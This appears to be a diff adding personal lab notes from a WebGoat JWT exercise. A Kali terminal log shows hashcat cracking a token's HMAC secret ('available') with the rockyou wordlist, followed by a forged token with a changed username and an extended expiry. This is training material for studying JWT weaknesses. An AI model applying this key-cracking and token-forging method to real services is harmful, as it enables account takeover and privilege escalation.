@@ -1,0 +1,118 @@
+
+
+++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++
+
+root@kali:~/BURP_LAB/JWT# ^C
+root@kali:~/BURP_LAB/JWT# hashcat -a0 -m 16500 text.hash [dict]
+hashcat (v6.1.1) starting...
+
+[dict]: No such file or directory
+
+Started: Fri Sep 11 19:07:43 2020
+Stopped: Fri Sep 11 19:07:43 2020
+root@kali:~/BURP_LAB/JWT# ^C
+root@kali:~/BURP_LAB/JWT# hashcat -a0 -m 16500 jwt
+jwt-pwn/ jwt.txt  
+root@kali:~/BURP_LAB/JWT# hashcat -a0 -m 16500 jwt
+jwt-pwn/ jwt.txt  
+root@kali:~/BURP_LAB/JWT# hashcat -a0 -m 16500 jwt.txt rockyou.txt
+hashcat (v6.1.1) starting...
+
+OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i5-8210Y CPU @ 1.60GHz, 4755/4819 MB (2048 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Initializing backend runtime for device #1...
+
+
+
+Host memory required for this attack: 64 MB
+
+Dictionary cache built:
+* Filename..: rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 6 secs
+
+
+
+
+eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTU5OTc5MzI0OCwiZXhwIjoxNTk5NzkzMzA4LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.yT8YG_rx7VAxcNfFNsowD_1s3o9RbojGMWn25d3Eoj8:available
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: JWT (JSON Web Token)
+Hash.Target......: eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIE...d3Eoj8
+Time.Started.....: Fri Sep 11 19:08:57 2020 (0 secs)
+Time.Estimated...: Fri Sep 11 19:08:57 2020 (0 secs)
+Guess.Base.......: File (rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   154.6 kH/s (10.67ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 34816/14344385 (0.24%)
+Rejected.........: 0/34816 (0.00%)
+Restore.Point....: 32768/14344385 (0.23%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: dyesebel -> anaxor
+
+Started: Fri Sep 11 19:07:57 2020
+Stopped: Fri Sep 11 19:08:59 2020
+root@kali:~/BURP_LAB/JWT# hashcat -a0 -m 16500 jwt.txt rockyou.txt
+
+++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++
+
+
+eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTU5OTc5MzI0OCwiZXhwIjo5OTk5NzkzMzA4LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IldlYkdvYXQiLCJFbWFpbCI6InRvbUB3ZWJnb2F0Lm9yZyIsIlJvbGUiOlsiTWFuYWdlciIsIlByb2plY3QgQWRtaW5pc3RyYXRvciJdfQ.7d59v_WYuB4dGcqadT7f75qXFL7nR3kKBQmxhPGLizM
+
+HEADER:ALGORITHM & TOKEN TYPE
+
+{
+  "alg": "HS256"
+}
+PAYLOAD:DATA
+
+WebGoat
+{
+  "iss": "WebGoat Token Builder",
+  "aud": "webgoat.org",
+  "iat": 1599793248,
+  "exp": 9999793308,
+  "sub": "tom@webgoat.org",
+  "username": "WebGoat",
+  "Email": "tom@webgoat.org",
+  "Role": [
+    "Manager",
+    "Project Administrator"
+  ]
+}
+VERIFY SIGNATURE
+
+HMACSHA256(
+  base64UrlEncode(header) + "." +
+  base64UrlEncode(payload),
+  
+available
+
+) secret base64 encoded
+############################################
+
+
